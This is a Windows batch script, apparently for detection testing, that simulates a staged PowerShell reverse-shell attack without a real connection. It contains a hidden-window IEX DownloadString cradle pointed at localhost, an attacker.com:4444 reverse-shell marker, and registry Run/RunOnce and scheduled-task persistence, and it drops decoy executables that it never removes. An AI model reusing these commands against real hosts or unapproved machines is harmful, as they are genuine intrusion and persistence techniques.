@echo off
REM PowerShell Reverse Shell Attack Simulation (safe - no actual connection)
set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS_CMD%" (
	echo ERROR: PowerShell not found.
	pause
	exit /b 1
)


echo ============================================
echo PowerShell Reverse Shell Attack Simulation
echo ============================================
echo.

"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$payload = [byte[]]::new(32768); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($payload); $publicExe = Join-Path $env:PUBLIC 'reverse_shell.exe'; $programDataDll = Join-Path $env:ProgramData 'reverse_shell.dll'; $stage2Exe = Join-Path $env:PUBLIC 'reverse_shell_stage2.exe'; foreach ($path in @($publicExe, $programDataDll, $stage2Exe)) { [System.IO.File]::WriteAllBytes($path, $payload) }; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ReverseShellSim' -Value $publicExe -PropertyType String -Force; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'ReverseShellSimOnce' -Value $programDataDll -PropertyType String -Force; $stagerDir = Join-Path $env:ProgramData 'ReverseShellSim'; New-Item -ItemType Directory -Path $stagerDir -Force | Out-Null; Set-Content -Path (Join-Path $stagerDir 'stager.txt') -Value 'reverse shell simulation';"
start "" cmd.exe /c "title ReverseShellSim && echo [SIM] cmd.exe stage active && timeout /t 3 /nobreak >nul && exit"
start "" "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '[SIM] PowerShell stage active'; Start-Sleep -Seconds 3"
schtasks /Create /F /SC ONLOGON /TN ReverseShellSim /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgA" >nul 2>&1

echo [*] Stage 1: Reverse shell pattern with IEX execution
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/rev') } catch { Write-Host '[SIM] Download failed as expected' }; Write-Host '[SIM] TCP reverse shell pattern to attacker.com:4444'; Write-Host '[SIM] IEX data exfiltration pattern'; Write-Host '[SIM] Stream-based command execution'; Write-Host '[SIM] encodedcommand + downloadstring + iex';"

echo [*] Stage 2: Dropping reverse shell payload
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$bytes = [byte[]]::new(16384); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\\reverse_shell.exe\", $bytes); [System.IO.File]::WriteAllBytes(\"$env:ProgramData\\reverse_shell.dll\", $bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\\startup_rev_shell.lnk\", $bytes); Write-Host '[SIM] Payload dropped to high-risk locations'"

echo [*] Stage 3: Persistence and shell pivot
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Write-Host ''[SIM] cmd.exe to powershell.exe shell pivot''; Start-Sleep -Seconds 3""'"

echo [*] Stage 4: Final malware payload - Attack completion marker
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$finalPayload = [byte[]]::new(24576); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($finalPayload); $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'; $finalExe = Join-Path $env:ProgramData \"malware_$timestamp.exe\"; [System.IO.File]::WriteAllBytes($finalExe, $finalPayload); Write-Host \"[SIM] Final malware artifact dropped to: $finalExe\"; [System.IO.File]::AppendAllText((Join-Path $env:ProgramData 'ReverseShellSim\attack_log.txt'), \"Damage marker created at $finalExe at $(Get-Date)\`r\n\");"

echo.
echo ============================================
echo SIMULATION COMPLETE - Final malware artifact created
echo ============================================
